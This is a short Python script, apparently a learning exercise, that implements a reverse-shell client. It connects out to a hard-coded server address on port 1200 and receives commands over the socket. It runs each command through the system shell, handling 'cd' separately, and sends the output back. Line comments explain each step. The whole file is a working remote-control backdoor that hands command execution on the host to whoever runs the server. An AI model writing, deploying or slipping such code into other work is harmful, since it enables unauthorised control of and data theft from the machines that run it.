import socket
import os #for operating system
import subprocess  #for processes that are on a windows laptop

socket = socket.socket()
host = "172.27.107.120" #ip address of server (use ifconfig/ipconfig to get it)
port = 1200 

socket.connect((host, port)) #to establish connection

while True:
    data = socket.recv(1024)
    if data[:2].decode("utf-8") == 'cd': #decodes from byte into string then takes first two characters
        os.chdir(data[3:].decode("utf-8")) #getting characters after 3rd character for change in directory command

    if len(data) > 0:
        #Popen will open up a process to execute (inside), gives access to shell commands (like dir)
        command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
        output_byte = command.stdout.read() + command.stderr.read()
        output_string = str(output_byte, "utf-8")

        current = os.getcwd() + "> " #getting the current working directory and formating it (the "> ")
        socket.send(str.encode(output_string))

        print(output_string)
